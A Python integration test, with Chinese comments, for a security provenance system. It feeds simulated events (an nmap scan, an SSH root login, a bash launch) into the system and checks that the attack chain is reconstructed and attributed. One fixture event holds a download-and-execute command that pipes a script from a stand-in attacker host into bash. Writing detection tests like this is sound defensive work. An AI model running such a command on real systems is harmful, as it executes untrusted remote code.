# tests/test_provenance_integration.py
import unittest
import sys
import os
from unittest.mock import MagicMock

sys.path.append(os.getcwd())

from analyzer.graph_analyzer.provenance_system import ProvenanceSystem
from analyzer.graph_analyzer.graph_builder import GraphBuilder
from analyzer.graph_analyzer.atlas_mapper import AtlasMapper
from analyzer.graph_analyzer.enrichment import IntelEnricher
from analyzer.graph_analyzer.pid_cache import PIDCache

class TestProvenanceIntegration(unittest.TestCase):
    def setUp(self):
        print(f"\n[{self._testMethodName}] 集成测试开始...")
        
        # 1. 模拟组员3 (Context Engine)
        # 我们不需要真的去查数据库，而是模拟组员3返回了关联好的事件列表
        self.mock_context_engine = MagicMock()
        
        # 2. 初始化组员4的所有组件
        self.pid_cache = PIDCache(cache_file="test_integ_pid.json")
        self.pid_cache.clear()
        
        # 使用真实的组件，而非 Mock，以测试它们的真实交互
        self.builder = GraphBuilder(pid_cache=self.pid_cache)
        self.mapper = AtlasMapper()
        self.enricher = IntelEnricher(mitre_stix_path=None) # 使用内置模拟数据
        
        # 3. 实例化系统
        self.system = ProvenanceSystem(
            context_engine=self.mock_context_engine,
            graph_builder=self.builder,
            atlas_mapper=self.mapper,
            enricher=self.enricher
        )

    def tearDown(self):
        if os.path.exists("test_integ_pid.json"):
            os.remove("test_integ_pid.json")

    def test_full_attack_chain_reconstruction(self):
        """测试完整攻击链重构：扫描 -> 爆破 -> 登录 -> 下载"""
        
        # --- 准备模拟数据 (模拟从数据库查出来的结果) ---
        host = "web-server-01"
        
        # 种子事件 (告警点)：检测到恶意下载
        seed_event = {
            "event": {"category": "process", "id": "evt_curl"},
            "host": {"name": host},
            "process": {
                "pid": 3000, "executable": "/usr/bin/curl",
                "command_line": "curl http://evil.com/malware.sh | bash",
                "start_time": "T4",
                "parent": {"pid": 2000} # 父进程是 SSHD
            },
            "timestamp": "T4"
        }

        # 关联事件 (由组员3找出)
        related_events = [
            # 1. Nmap 扫描 (早期侦察)
            {
                "event": {"category": "process", "id": "evt_nmap"},
                "host": {"name": host},
                "process": {"pid": 1000, "executable": "/usr/bin/nmap", "start_time": "T1"},
                "timestamp": "T1"
            },
            # 2. SSH 登录成功 (入口)
            {
                "event": {"category": "authentication", "action": "success", "id": "evt_ssh"},
                "host": {"name": host},
                "user": {"name": "root"},
                "timestamp": "T2"
            },
            # 3. Bash 启动 (被 SSHD 启动)
            {
                "event": {"category": "process", "id": "evt_bash"},
                "host": {"name": host},
                "process": {
                    "pid": 2000, "executable": "/bin/bash", "start_time": "T3",
                    "parent": {"pid": 1} # 简化，假设直接挂在 init 下或 sshd
                },
                "timestamp": "T3"
            },
            # 4. Curl 下载 (也就是种子事件本身)
            seed_event
        ]

        # 设置 Mock：当调用 find_related_events 时返回上述列表
        self.mock_context_engine.find_related_events.return_value = related_events

        # --- 执行核心逻辑 ---
        print("   正在执行 rebuild_attack_path...")
        result = self.system.rebuild_attack_path(seed_event)

        # --- 验证结果 ---
        
        # 1. 验证统计信息
        stats = result['stats']
        print(f"   [Stats] 处理事件数: {stats['events_processed']}")
        self.assertEqual(stats['events_processed'], 4, "未能处理所有4个关联事件")
        
        # 2. 验证关键标签是否存在 (AtlasMapper 是否工作)
        path_sig = result['path_signature']
        print(f"   [Signature] 攻击路径签名: {path_sig}")
        self.assertIn("NETWORK_SCANNER", path_sig, "未识别出 Nmap 扫描")
        self.assertIn("DOWNLOAD_AND_EXECUTE", path_sig, "未识别出下载执行行为")
        
        # 3. 验证 APT 归因 (Enricher 是否工作)
        attribution = result['intelligence']['attribution']
        print(f"   [Attribution] 疑似组织: {attribution['suspected_group']}")
        # 这里的归因结果取决于 enrichment.py 里的模拟数据，只要它不报错且有结构即可
        self.assertIn('suspected_group', attribution)
        
        # 4. 验证图结构 (GraphBuilder 是否工作)
        nodes = result['graph']['nodes']
        edges = result['graph']['edges']
        print(f"   [Graph] 节点数: {len(nodes)}, 边数: {len(edges)}")
        self.assertTrue(len(nodes) >= 3)
        self.assertTrue(len(edges) >= 1)

        print("   ✅ 完整攻击链重构集成测试通过")

if __name__ == '__main__':
    unittest.main()
